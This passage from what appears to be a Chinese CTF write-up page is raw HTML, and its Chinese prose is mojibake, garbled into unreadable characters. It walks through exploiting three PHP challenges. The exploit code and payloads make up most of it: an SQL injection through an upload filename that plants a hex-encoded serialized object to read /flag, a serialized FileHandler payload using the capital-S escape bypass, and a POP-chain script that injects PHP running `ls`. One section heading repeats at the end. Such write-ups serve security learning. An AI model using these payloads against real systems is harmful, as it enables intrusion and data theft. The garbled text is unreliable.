æ¬¡ï¼Œå°±å¯ä»¥å‘ç°æ–‡ä»¶åå˜åŒ–ï¼Œæœ¨é©¬æ–‡ä»¶ç”Ÿæ•ˆã€‚</p><h2 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><p>ä¿¡æ¯æ”¶é›†</p><ol><li><p>æºç ä¸Šä¼ åˆ°gitubä¸Šäº†</p><p><img src="/../images/1583830520899-1687419234884.png" alt="img"></p><p><img src="/../images/1583830536747-1687419234885.png" alt="img"></p><p><img src="/../images/image-20220807130328561-1687419234885.png" alt="image-20220807130328561"></p></li><li><p>show.phpä¸­çš„æç¤º</p><p><img src="/../images/image-20220807130405750-1687419234885.png" alt="image-20220807130405750"></p><blockquote><p>åŠæˆå“ï¼Œåªæœ‰æ–‡ä»¶çš„åå­—è¢«ä¿å­˜ã€‚</p></blockquote></li></ol><p>ä»£ç å®¡è®¡</p><ol><li><p>åºåˆ—åŒ–å…¥å£</p><p>helperç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#è·å¾—æ–‡ä»¶å„ç§ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];<span class="comment">#åŸæ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">#éšæœºå</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];<span class="comment">#åç¼€</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#è·¯å¾„</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åºåˆ—åŒ–å­˜å‚¨æ–‡ä»¶çš„å¤§å°</span></span><br><span class="line"><span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">    <span class="comment">#å°†æ–‡ä»¶ä¿¡æ¯æ’å…¥åˆ°æ•°æ®åº“ä¸­</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getfile</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#éšæœºå</span></span><br><span class="line"><span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="comment">#å¤„ç†æ–‡ä»¶åç¼€å</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line"><span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#title=æ–‡ä»¶å</span></span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">#å¤„ç†æ–‡ä»¶å„ç§ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line"><span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#insertæ’å…¥æ–‡ä»¶å„ç§ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç»è¿‡ä¸Šé¢çš„ä»£ç å®¡è®¡å¯çŸ¥ï¼Œåªå¯¹æ–‡ä»¶çš„åç¼€åä½œäº†å¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å‚æ—¶èƒ½åˆ©ç”¨æ–‡ä»¶åå³title</p><p>å¹¶ä¸”å…¶å°†æ–‡ä»¶åä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå°±å¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</p><p><code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></p><p>â†’<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p></blockquote></li><li><p>ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line"><span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>åªå°†attrè¿›è¡Œååºåˆ—åŒ–</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ titleä½¿å¾—atträ¸ºæˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–å†…å®¹ã€‚</p><p><code>title=1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#</code></p><p><code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p><p>â†’<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39; 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)</code></p></blockquote></li><li><p>åˆ©ç”¨</p><p>helpç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°è°ƒç”¨äº†view_files</p><p>helpç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç»¼ä¸Šåˆ©ç”¨çš„å±æ€§</p><p>help-&gt;ifview &#x3D; True</p><p>help-&gt;config &#x3D; flagè·¯å¾„</p></blockquote><p>popé“¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$ifview</span> = True; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ååºåˆ—åŒ–å‰<code>$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è½¬æ¢ä¸º16è¿›åˆ¶ ä¸èƒ½æœ‰å¼•å·</span></span><br><span class="line"><span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#`</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807140140896-1687419234886.png" alt="image-20220807140140896"></p><p><img src="/../images/image-20220807140151143-1687419234886.png" alt="image-20220807140151143"></p></li></ol><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><h3 id="1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–"><a href="#1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–" class="headerlink" title="1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–"></a>1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–</h3><h3 id="2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹"><a href="#2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹" class="headerlink" title="2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹"></a>2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹</h3><p>ä¼ å‚strâ†’is_valid()å‡½æ•°è¿‡æ»¤â†’unserialize()å‡½æ•°è§¦å‘destruct()å‡½æ•°ï¼šåˆ¤æ–­opâ†’è°ƒç”¨process()å‡½æ•°ï¼Œopä¸º2æ—¶â†’è°ƒç”¨read()å‡½æ•°</p><h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">ä¸ä¿®æ”¹å±æ€§ï¼Œä½¿ç”¨å¤§S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ï¼ˆ1ï¼‰opçš„å€¼"><a href="#ï¼ˆ1ï¼‰opçš„å€¼" class="headerlink" title="ï¼ˆ1ï¼‰opçš„å€¼"></a>ï¼ˆ1ï¼‰opçš„å€¼</h4><p>å¯ä»¥ä¸ºâ€™   2â€™å’Œ2æ¥ä½¿destruct()ä¸­çš„ä¸æˆç«‹</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>ç»•è¿‡process()çš„</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S"><a href="#ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S" class="headerlink" title="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S"></a>ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.åªå…è®¸å¯æ‰“å°å­—ç¬¦ï¼Œè€ŒåŸå…ˆæ˜¯protectedç±»å‹ï¼Œåºåˆ—åŒ–ä»¥åä¼šæœ‰ä¸å¯æ‰“å°å­—ç¬¦%00</p><p>è€ŒæŸ¥è¯¢å¾—çŸ¥åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚</p><p>2.protectedå±æ€§åºåˆ—åŒ–ä¼šå¼•å…¥\00<em>\00ã€‚ä½†æ˜¯\00æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚å³æ‰‹åŠ¨å°†\00</em>\00å˜ä¸º\x00*\x00</p><h2 id="2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop"><a href="#2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop" class="headerlink" title="2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop"></a>2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()â†’what::<span class="title function_ invoke__">__tostring</span>()â†’mix::<span class="title function_ invoke__">__run</span>()â†’crow::<span class="title function_ invoke__">__invoke</span>()â†’fin::<span class="title function_ invoke__">__call</span>()â†’mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é‡å¤ç”¨åˆ°äº†fin-&gt;f1å’Œmin-&gt;m1ï¼Œæ‰€ä»¥æœ‰$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz-1"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz-1" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><h3 id="1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–-1"><a href="#1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–-1" class="headerlink" title="1.å‘ç°æ„é€ 